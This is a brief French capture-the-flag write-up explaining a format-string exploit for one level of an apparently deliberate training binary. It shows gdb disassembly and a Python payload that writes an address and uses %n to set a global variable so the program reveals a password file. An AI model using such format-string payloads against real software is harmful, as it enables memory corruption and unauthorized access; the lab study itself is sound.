Comme dans le level precedant la technique est la meme sauf que la le buffer est top petit pour tout ecrire dans le fgets.

Donc on va laisser printf remplir les 16930112 + les 4 octets de l'adresse pour que 16930116 soit stocké dans la variables globales m et que la comparaison soit validé afin d'affiché le fichier .pass

```gdb
0x0804848d <+54>:	mov    eax,ds:0x8049810
0x08048492 <+59>:	cmp    eax,0x1025544
0x08048497 <+64>:	jne    0x80484a5 <n+78>
```

```bash
python -c "print('\x10\x98\x04\x08%16930112x%12\$n')" > /tmp/exploit4
```